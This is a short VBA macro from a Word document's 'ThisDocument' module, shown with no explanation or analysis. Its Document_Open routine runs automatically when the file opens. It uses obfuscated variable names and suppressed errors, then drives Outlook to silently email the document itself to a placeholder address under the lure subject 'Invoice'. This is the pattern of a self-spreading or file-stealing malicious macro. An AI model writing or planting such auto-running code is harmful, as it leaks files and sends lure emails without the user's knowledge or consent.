Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim jybosg1pnivrj As Object, lps4wdhm As Object
    On Error Resume Next
    Set jybosg1pnivrj = CreateObject("Outlook.Application")
    Set lps4wdhm = jybosg1pnivrj.CreateItem(0)
    lps4wdhm.To = "recipient@example.com"
    lps4wdhm.Subject = "Invoice"
    lps4wdhm.Body = "Please find the attached document."
    lps4wdhm.Attachments.Add ActiveDocument.FullName
    lps4wdhm.Send
End Sub
